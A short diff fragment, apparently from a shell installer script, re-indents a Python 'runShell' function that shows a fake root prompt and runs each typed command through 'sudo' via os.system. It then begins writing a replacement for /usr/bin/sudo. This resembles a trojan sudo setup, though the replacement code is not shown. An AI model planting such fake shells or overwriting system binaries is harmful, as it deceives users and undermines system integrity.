@@ -41,14 +41,14 @@ def runShell():
     host = socket.gethostname()
     while(cont):
         option = input("[root@"+host+" "+directory+"]# ")
-    if(len(option) == 0):
-        pass
-    elif(option.lower() in ('exit')):
-        print("exit")
-        return
-    else:
-        command = "sudo "+option
-        os.system(command)
+        if(len(option) == 0):
+            pass
+        elif(option.lower() in ('exit')):
+            print("exit")
+            return
+        else:
+            command = "sudo "+option
+            os.system(command)
 main()
 EOFA
 cat <<EOFB > /usr/bin/sudo
